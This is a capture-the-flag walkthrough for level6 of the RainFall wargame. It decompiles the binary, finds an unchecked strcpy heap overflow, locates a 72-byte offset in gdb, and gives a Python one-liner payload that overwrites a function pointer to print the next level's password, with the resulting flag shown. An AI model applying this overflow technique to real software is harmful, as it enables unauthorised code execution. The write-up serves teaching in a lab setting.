## Basic analysis
Let's see what **level6** binary does:
~~~shell
./level6
Segmentation fault (core dumped)
./level6 42
Nope
~~~
Okay, no more stdin, here we will have to enter some passphrase for the binary to give up the flag for next level. Let's take a look inside with Ghidra:
~~~C
void main(undefined4 param_1,int param_2)
{
  char *__dest;
  code **ppcVar1;
  
  __dest = (char *)malloc(0x40);
  ppcVar1 = (code **)malloc(4);
  *ppcVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (**ppcVar1)();
  return;
}

void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)

{
  puts("Nope");
  return;
}
~~~
Well, that is not nice at all. From the basic flow, we can read that we can enter whatever we want and we will get **Nope** in return.
There is, however also function **n()**:
~~~C
void n(void)
{
  system("/bin/cat /home/user/level7/.pass");
  return;
}
~~~
That's better, that is what we want to see! How do we get to this function? Well, there is a **strcpy()**, which is, according to the **man** pages, vulnerable to buffer overflow:
*"If the destination string of a strcpy() is not large enough, then anything might happen. Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine."*

So, this is our old friend...

## Buffer overflow payload

We will find the offset using the **Wiremask** tool:
~~~shell
level6@RainFall:~$ gdb ./level6
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae
Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
(gdb) 
~~~
Found offset of **72**.

Now the payload - must be sent as a argument, because the program segfaults without it:
~~~shell
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
~~~


